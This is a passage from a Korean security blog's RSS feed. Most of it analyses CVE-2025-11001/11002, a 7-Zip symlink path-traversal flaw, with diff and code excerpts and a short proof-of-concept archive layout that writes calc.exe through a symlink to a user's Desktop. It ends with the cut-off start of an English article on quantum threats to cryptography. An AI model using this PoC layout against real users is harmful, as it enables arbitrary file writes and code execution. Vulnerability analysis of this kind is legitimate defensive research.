<span class="hljs-keyword">return</span> status;}tf_payload_len = (uint16_t)payload_calc;</code></pre><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><p><a href="https://nvd.nist.gov/vuln/detail/cve-2025-30356">https://nvd.nist.gov/vuln/detail/cve-2025-30356</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/CryptoLib/">CryptoLib</category>
      
      <category domain="https://hackyboiz.github.io/tags/Heap-buffer-overflow/">Heap_buffer_overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/Nasa/">Nasa</category>
      
      <category domain="https://hackyboiz.github.io/tags/cFS/">cFS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/22/OUYA77/2025-10-22/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-11001, CVE-2025-11002: 7-Zip의 심볼릭링크 처리 취약점으로 인한 Arbitrary File Write / RCE 가능성</title>
      <link>https://hackyboiz.github.io/2025/10/18/clalxk/CVE-2025-11001/</link>
      <guid>https://hackyboiz.github.io/2025/10/18/clalxk/CVE-2025-11001/</guid>
      <pubDate>Sat, 18 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-25-949/&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-949/">https://www.zerodayinitiative.com/advisories/ZDI-25-949/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>7-Zip : &#x2264; 24.09</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-11001 / CVE-2025-11002&#xB294; 7-Zip&#xC758; ZIP &#xCD94;&#xCD9C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;(&#xD2B9;&#xD788; Linux/WSL &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xB41C; &#xB9C1;&#xD06C; &#xB370;&#xC774;&#xD130;)&#xB97C; &#xD30C;&#xC2F1;&#xB7;&#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC758; &#xB17C;&#xB9AC;&#xC801; &#xACB0;&#xD568;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD30C;&#xC11C;&#xAC00; Windows &#xC808;&#xB300;&#xACBD;&#xB85C;<code>C:\...</code>&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xB9C1;&#xD06C;&#xB97C; <strong>&#xB9AC;&#xB205;&#xC2A4;&#xC2DD; &#xAC80;&#xC0AC;</strong>&#xB85C; &#xC808;&#xB300; &#xC5EC;&#xBD80;&#xB97C; &#xC624;&#xD310;&#xD558;&#xBA74; <code>isRelative</code>&#xAC00; &#xC798;&#xBABB; &#xC124;&#xC815;&#xB418;&#xACE0;, &#xC774;&#xD6C4; &#x2018;relativize&#x2019; &#xACFC;&#xC815;&#xC5D0;&#xC11C; ZIP &#xB0B4;&#xBD80; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC811;&#xB450;&#xC0AC;&#xAC00; &#xBD99;&#xC73C;&#xBA74;&#xC11C; <code>IsSafePath</code> &#xAC80;&#xC0AC;&#xB85C; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xB85C; &#xC77C;&#xBD80; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xD750;&#xB984;&#xC740; &#xD56D;&#xBAA9; &#xD0C0;&#xC785; &#xAC80;&#xC0AC;(&#xC608;: _item.IsDir)&#xB85C; &#xC778;&#xD574; &#xBE60;&#xC838;&#xB098;&#xAC00; &#xBC84;&#xB824; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; reparse &#xB370;&#xC774;&#xD130;&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xACE0;, &#xCD94;&#xCD9C; &#xC911;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xB530;&#xB77C; &#xC784;&#xC758; &#xC704;&#xCE58;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xC4F0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="IsSafePath&#xC640;-CLinkLevelsInfo-Parse-diff"><a href="#IsSafePath&#xC640;-CLinkLevelsInfo-Parse-diff" class="headerlink" title="IsSafePath&#xC640; CLinkLevelsInfo::Parse diff"></a>IsSafePath&#xC640; CLinkLevelsInfo::Parse diff</h3><pre><code class="hljs cpp">-<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">IsSafePath</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path)</span></span>+static bool IsSafePath(const UString &amp;path, bool isWSL) {   CLinkLevelsInfo levelsInfo;-  levelsInfo.Parse(path);+  levelsInfo.Parse(path, isWSL);   <span class="hljs-keyword">return</span> !levelsInfo.IsAbsolute       &amp;&amp; levelsInfo.LowLevel &gt;= <span class="hljs-number">0</span>       &amp;&amp; levelsInfo.FinalLevel &gt; <span class="hljs-number">0</span>; } +<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">IsSafePath</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path)</span></span>;+<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">IsSafePath</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path)</span></span>+{+  <span class="hljs-keyword">return</span> IsSafePath(path, <span class="hljs-literal">false</span>); <span class="hljs-comment">// isWSL</span>+}+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CLinkLevelsInfo::Parse</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path, <span class="hljs-keyword">bool</span> isWSL)</span></span><span class="hljs-function"> </span>{-  IsAbsolute = NName::IsAbsolutePath(path);-+  IsAbsolute = isWSL ?+      IS_PATH_SEPAR(path[<span class="hljs-number">0</span>]) :+      NName::IsAbsolutePath(path);   LowLevel = <span class="hljs-number">0</span>;   FinalLevel = <span class="hljs-number">0</span>; }</code></pre><p>7-Zip 24.09&#xC640; 25.00&#xC744; diff &#xD574;&#xBCF4;&#xBA74; &#xC774;&#xBC88; &#xB9B4;&#xB9AC;&#xC2A4;&#xC5D0;&#xC11C; &#xBA87; &#xAC00;&#xC9C0; &#xBC84;&#xADF8;&#xAC00; &#xC218;&#xC815;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xD328;&#xCE58;&#xB294; CPP/7zip/UI/Common/ArchiveExtractCallback.cpp&#xC758; zip &#xC555;&#xCD95; &#xD574;&#xC81C; &#xAD00;&#xB828; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C; &#xCF54;&#xB4DC;&#xAC00; &#xB9CE;&#xC774; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xC911;&#xC5D0;&#xC11C;&#xB3C4; <code>IsSafePath</code> &#xD568;&#xC218;&#xAC00; &#xB208;&#xC5D0; &#xB744;&#xAC8C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p><strong>1) &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C; &#xC2DD;&#xBCC4;</strong></p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (_curSize_Defined &amp;&amp; _curSize &gt; <span class="hljs-number">0</span> &amp;&amp; _curSize &lt; (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">12</span>)){  <span class="hljs-keyword">if</span> (_fi.IsLinuxSymLink())  {    is_SymLink_in_Data = <span class="hljs-literal">true</span>;    _is_SymLink_in_Data_Linux = <span class="hljs-literal">true</span>;  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_fi.IsReparse())  {    is_SymLink_in_Data = <span class="hljs-literal">true</span>;    _is_SymLink_in_Data_Linux = <span class="hljs-literal">false</span>;  }}</code></pre><p>&#xC2DC;&#xC791;&#xC810;&#xC740; CArchiveExtractCallback::GetStream()&#xC774;&#xBA70;, &#xC774; &#xD568;&#xC218;&#xB294; ReadLink&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. <code>GetStream()</code>&#xC740; <code>CArchiveExtractCallback::GetExtractStream()</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370;, &#xD30C;&#xC77C; &#xD06C;&#xAE30;&#xAC00; &#xC791;&#xC73C;&#xBA74; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xC2DD;&#xBCC4;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xD6C4; &#xC804;&#xCCB4; &#xD30C;&#xC77C; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>2) reparse &#xBAA8;&#xB4DC; &#xBC0F; &#xB9C1;&#xD06C; &#xD30C;&#xC2F1;: CLinkInfo::Parse &#xD638;&#xCD9C;</strong></p><p>&#xCD94;&#xAC00; &#xCC98;&#xB9AC; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCE5C; &#xB4A4; <code>CArchiveExtractCallback::CloseReparseAndFile()</code>&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xC2DC;&#xC791;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xB9C1;&#xD06C;&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xC5EC; &#xADF8;&#xAC83;&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB824;&#xB294; &#xC704;&#xCE58;(&#xBAA9;&#xC801;&#xC9C0;)&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xB824; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// &#xC815;&#xC758;</span><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">CLinkInfo::Parse</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Byte *data, <span class="hljs-keyword">size_t</span> dataSize, <span class="hljs-keyword">bool</span> isLinuxData)</span></span>;</code></pre><pre><code class="hljs cpp"><span class="hljs-keyword">bool</span> repraseMode = <span class="hljs-literal">false</span>;<span class="hljs-keyword">bool</span> needSetReparse = <span class="hljs-literal">false</span>;CLinkInfo linkInfo;<span class="hljs-keyword">if</span> (_bufPtrSeqOutStream){  repraseMode = <span class="hljs-literal">true</span>;  reparseSize = _bufPtrSeqOutStream_Spec-&gt;GetPos();  <span class="hljs-keyword">if</span> (_curSize_Defined &amp;&amp; reparseSize == _outMemBuf.Size())  {    <span class="hljs-comment">// _is_SymLink_in_Data_Linux == true </span>    needSetReparse = linkInfo.Parse(_outMemBuf, reparseSize, _is_SymLink_in_Data_Linux);    <span class="hljs-keyword">if</span> (!needSetReparse)      res = SendMessageError_with_LastError(<span class="hljs-string">&quot;Incorrect reparse stream&quot;</span>, us2fs(_item.Path));  }}</code></pre><p>&#xD30C;&#xC11C;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xC911;&#xC694;&#xD55C; &#xC18D;&#xC131;&#xC744; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>Link path</strong> (&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xC758; &#xBAA9;&#xC801;&#xC9C0; &#xACBD;&#xB85C;)</li><li><strong>isRelative</strong> (&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC0C1;&#xB300; &#xACBD;&#xB85C;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;)</li></ul><hr><h3 id="Issue-1"><a href="#Issue-1" class="headerlink" title="Issue #1"></a>Issue #1</h3><p>&#xB9AC;&#xB205;&#xC2A4; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC708;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0C0;&#xC77C;&#xC758; <code>C:\</code> &#xACBD;&#xB85C;&#xB85C; &#xC124;&#xC815;&#xB420; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> SUPPORT_LINKS</span><span class="hljs-keyword">if</span> (repraseMode){  _curSize = reparseSize;  _curSize_Defined = <span class="hljs-literal">true</span>;    <span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> SUPPORT_LINKS</span>  <span class="hljs-keyword">if</span> (needSetReparse)  {    <span class="hljs-keyword">if</span> (!DeleteFileAlways(_diskFilePath))    {      RINOK(SendMessageError_with_LastError(<span class="hljs-string">&quot;can&apos;t delete file&quot;</span>, _diskFilePath))    }    {      <span class="hljs-keyword">bool</span> linkWasSet = <span class="hljs-literal">false</span>;      RINOK(SetFromLinkPath(_diskFilePath, linkInfo, linkWasSet))      <span class="hljs-keyword">if</span> (linkWasSet)        _isSymLinkCreated = linkInfo.IsSymLink();      <span class="hljs-keyword">else</span>        _needSetAttrib = <span class="hljs-literal">false</span>;    }  }  <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>}<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></code></pre><p>&#xB9C1;&#xD06C; &#xACBD;&#xB85C;&#xB294; &#xC804;&#xCCB4; C:\ &#xACBD;&#xB85C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC9C0;&#xB9CC;, &#xD30C;&#xC11C;&#xB294; &#xC808;&#xB300; &#xACBD;&#xB85C; &#xD310;&#xB2E8;&#xC744; &#xB9AC;&#xB205;&#xC2A4; &#xC2A4;&#xD0C0;&#xC77C;&#xC758; &#xAC80;&#xC0AC;&#xB85C; &#xB530;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xADF8; &#xB9C1;&#xD06C;&#xB97C; <strong>relative</strong>&#xB85C; &#xD45C;&#xAE30;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-2"><a href="#Issue-2" class="headerlink" title="Issue #2"></a>Issue #2</h3><p>SetFromLinkPath&#xB294; &#xC9C0;&#xC815;&#xB41C; &#xACBD;&#xB85C;&#xB85C; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xB85C; &#xB9C1;&#xD06C;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xB294; &#xC548;&#xC804; &#xC7A5;&#xCE58;&#xAC00; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC874;&#xC7AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (linkInfo.isRelative)  relatPath = GetDirPrefixOf(_item.Path);relatPath += linkInfo.linkPath;<span class="hljs-keyword">if</span> (!IsSafePath(relatPath)){  <span class="hljs-keyword">return</span> SendMessageError2(        <span class="hljs-number">0</span>, <span class="hljs-comment">// errorCode</span>        <span class="hljs-string">&quot;Dangerous link path was ignored&quot;</span>,        us2fs(_item.Path),        us2fs(linkInfo.linkPath)); <span class="hljs-comment">// us2fs(relatPath)</span>}</code></pre><p>7-Zip&#xC740; &#xC0C8;&#xB85C; &#xCD94;&#xCD9C;&#xB418;&#xB294; zip &#xD30C;&#xC77C; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xB9C1;&#xD06C;&#xAC00; &#xAC00;&#xB9AC;&#xD0AC; &#xC0C1;&#xB300; &#xBAA9;&#xC801;&#xC9C0; &#xACBD;&#xB85C;&#xB97C; &#xAD6C;&#xC131;&#xD55C; &#xD6C4; <code>IsSafePath</code>&#xB85C; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC0C1;&#xB300; &#xB9C1;&#xD06C;&#xC758; &#xACBD;&#xC6B0; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC704;&#xCE58;&#xD55C; zip &#xB0B4;&#xBD80; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xB9C1;&#xD06C; &#xACBD;&#xB85C; &#xC55E;&#xC5D0; &#xB367;&#xBD99;&#xC5EC; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-3"><a href="#Issue-3" class="headerlink" title="Issue #3"></a>Issue #3</h3><p>Issue 1&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB4EF;, &#xC0C1;&#xB300;&#xB9C1;&#xD06C;&#xB85C; &#xC798;&#xBABB; &#xD310;&#xB2E8;&#xB418;&#xC5B4; <code>isRelative == true</code> &#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; zip&#xC758; &#xB8E8;&#xD2B8;&#xAC00; &#xC544;&#xB2CC; &#xC544;&#xBB34; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC548;&#xC5D0; &#xC788;&#xC73C;&#xBA74;, &#xADF8; &#xB0B4;&#xBD80; &#xACBD;&#xB85C;&#xAC00; &#xB9C1;&#xD06C; &#xC55E;&#xC5D0; &#xB354;&#xD574;&#xC838;&#xC11C; &#xAC80;&#xC0AC; &#xC2DC; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xAC80;&#xC0AC;&#xB294; <code>IsSafePath(&quot;some/directory/in/zip&quot; + &quot;C:\some\other\path&quot;)</code>&#xCC98;&#xB7FC; &#xD3C9;&#xAC00;&#xB418;&#xBA70;, &#xC774; &#xACBD;&#xC6B0; true&#xB85C; &#xD310;&#xC815;&#xB418;&#xC5B4; &#xD1B5;&#xACFC;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-4"><a href="#Issue-4" class="headerlink" title="Issue #4"></a>Issue #4</h3><p>&#xC2E4;&#xC81C; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xB9C1;&#xD06C; &#xACBD;&#xB85C;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC80;&#xC0AC;&#xAC00; &#xC788;&#xC5B4;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, &#xADF8; &#xC774;&#xC804;&#xC5D0; &#xC8FC;&#xC5B4;&#xC9C4; &#x2018;item(&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;)&#x2019;&#xC774; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (!_ntOptions.SymLinks_AllowDangerous.Val){  <span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN32</span>  <span class="hljs-keyword">if</span> (_item.IsDir) <span class="hljs-comment">// NOPE</span>  <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>  <span class="hljs-keyword">if</span> (linkInfo.isRelative)    {      CLinkLevelsInfo levelsInfo;      levelsInfo.Parse(linkInfo.linkPath);      <span class="hljs-keyword">if</span> (levelsInfo.FinalLevel &lt; <span class="hljs-number">1</span> || levelsInfo.IsAbsolute)      {        <span class="hljs-keyword">return</span> SendMessageError2(          <span class="hljs-number">0</span>, <span class="hljs-comment">// errorCode</span>          <span class="hljs-string">&quot;Dangerous symbolic link path was ignored&quot;</span>,          us2fs(_item.Path),          us2fs(linkInfo.linkPath));      }    }}</code></pre><p>&#xC774;&#xB54C;, &#xD56D;&#xBAA9;&#xC740; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xC544;&#xB2C8;&#xBBC0;&#xB85C; &#xD1B5;&#xACFC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xC0AC;&#xC2E4;&#xC0C1; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xAC00; &#xC6B0;&#xD68C;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-5"><a href="#Issue-5" class="headerlink" title="Issue #5"></a>Issue #5</h3><p>&#xC704; 4&#xAC00;&#xC9C0;&#xC758; Issue&#xB97C; &#xBAA8;&#xB450; &#xB9C8;&#xCE58;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// existPath -&gt; C:\some\other\path (symlink destination)</span><span class="hljs-comment">// data -&gt; path for symlink to be created </span><span class="hljs-comment">// Initializes reparse data for symlink creation</span><span class="hljs-keyword">if</span> (!FillLinkData(data, fs2us(existPath), !linkInfo.isJunction, linkInfo.isWSL))  <span class="hljs-keyword">return</span> SendMessageError(<span class="hljs-string">&quot;Cannot fill link data&quot;</span>, us2fs(_item.Path));<span class="hljs-comment">/// ...</span><span class="hljs-comment">// creates symlink</span><span class="hljs-keyword">if</span> (!NFile::NIO::SetReparseData(fullProcessedPath, _item.IsDir, data, (DWORD)data.Size())){  RINOK(SendMessageError_with_LastError(kCantCreateSymLink, fullProcessedPath))  <span class="hljs-keyword">return</span> S_OK;}</code></pre><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="hljs cpp">data/link -&gt; (symlink) C:\Users\YOURUSERNAME\Desktop (&#xB610;&#xB294; &#xC6D0;&#xD558;&#xB294; &#xB2E4;&#xB978; &#xC704;&#xCE58;)data/link -&gt; (Directory)data/link/calc.exe -&gt; (&#xCD94;&#xCD9C; &#xC2DC; &#xB300;&#xC0C1; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC4F0;&#xACE0;&#xC790; &#xD558;&#xB294; &#xD30C;&#xC77C;)</code></pre><p>&#xC2EC;&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xAD6C;&#xC870;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC555;&#xCD95;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xACBD;&#xC6B0; link(&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;)&#xAC00; &#xBA3C;&#xC800; &#xD480;&#xB824; &#xC0DD;&#xC131;&#xB418;&#xACE0;, &#xC774;&#xD6C4; calc.exe&#xAC00; symlink&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC2E4;&#xC81C; &#xC704;&#xCE58;(&#xC608;: C:\Users\YOURUSERNAME\Desktop)&#xB85C; &#xD480;&#xB824; &#xC4F0;&#xC5EC;&#xC9D1;&#xB2C8;&#xB2E4;. 7-Zip&#xC774; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xB97C; &#xB530;&#xB77C;&#xAC00;&#xC11C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC784;&#xC758;&#xC758; &#xC704;&#xCE58;&#xC5D0; &#xC4F0;&#xAC8C; &#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/pacbypass/CVE-2025-11001">https://github.com/pacbypass/CVE-2025-11001</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/7-zip/">7-zip</category>
      
      <category domain="https://hackyboiz.github.io/tags/zip/">zip</category>
      
      <category domain="https://hackyboiz.github.io/tags/symlink/">symlink</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path-traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-11001/">CVE-2025-11001</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-11002/">CVE-2025-11002</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/18/clalxk/CVE-2025-11001/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] The Quantum Threat to Classical Security (en)</title>
      <link>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/en/</link>
      <guid>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/en/</guid>
      <pubDate>Sun, 12 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;1-Introduction&quot;&gt;&lt;a href=&quot;#1-Introduction&quot; class=&quot;headerlink&quot; title=&quot;1. Introduction&quot;&gt;&lt;/a&gt;1. Introduction&lt;/h2&gt;&lt;p&gt;Hello! Today, I&amp;#x20</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h2><p>Hello! Today, I&#x2019;d like to take a break and talk about quantum computers. In recent years, as quantum computing technology has advanced rapidly, we&#x2019;re seeing that existing cryptographic systems, which we&#x2019;ve long believed to be secure, are under threat.</p><p>The reason is that most cryptography relies on the assumption that certain calculations are difficult. For example, RSA is based on the difficulty of factoring large numbers, while ECDHE relies on the difficulty of computing discrete logarithms over elliptic curves. However, quantum computers can perform these calculations much faster than classical computers.</p><p>This is possible due to the properties of quantum superposition and entanglement, which allow multiple paths to be considered simultaneously in a single operation. As a result, cryptanalysis that was previously considered &#x201C;practically impossible&#x201D; has become theoretically feasible.</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image.png" alt></p><p>The point at which quantum computers can decrypt current cryptography is called <strong>Q-Day (Quantum Day)</strong>. While the exact timing of Q-Day remains uncertain, major companies like IBM, Google, IonQ, and Syquantum are striving to build quantum computers with hundreds of qubits. Consequently, the IT industry views Q-Day not as mere speculation but as a tangible risk.</p><p>Therefore, today we&#x2019;ll cover the fundamental characteristics of quantum computers and the algorithms they use to break existing encryption. I&#x2019;ll explain it as clearly as possible!</p><h2 id="2-Quantum-Computers"><a href="#2-Quantum-Computers" class="headerlink" title="2. Quantum Computers"></a>2. Quantum Computers</h2><p>Quantum computers operate on principles entirely different from conventional digital computers. While traditional computers represent information using two states&#x2014;0 and 1&#x2014;as electrical signals, quantum computers express information using units called &#x2018;qubits&#x2019;.</p><p>A qubit doesn&#x2019;t simply hold one value, either 0 or 1. Through a state called quantum superposition, it can exist in a state where 0 and 1 are present simultaneously. This allows quantum computers to perform parallel computations, unlike conventional computers.</p><p>Mathematically, the state of a qubit can be expressed as follows:</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image1.png" alt></p><p>Here, &#x3B1; and &#x3B2; are probability amplitudes, and these two values always satisfy the relationship &#x2223;&#x3B1;&#x2223;&#xB2; + &#x2223;&#x3B2;&#x2223;&#xB2; = 1. This means a qubit exists in a state simultaneously containing the &#x201C;probability of being 0 (&#x2223;&#x3B1;&#x2223;^2)&#x201D; and the &#x201C;probability of being 1 (&#x2223;&#x3B2;&#x2223;^2)&#x201D;. This state exists probabilistically until we measure it; once measured, it collapses into a single value.</p><p>Thanks to this property, quantum computers can explore multiple possibilities simultaneously in a single operation&#x2014;something classical computers must compute sequentially. Consequently, quantum computers can achieve vastly faster computation speeds than classical computers for specific problems (e.g., factorization, optimization, search, etc.).</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image2.png" 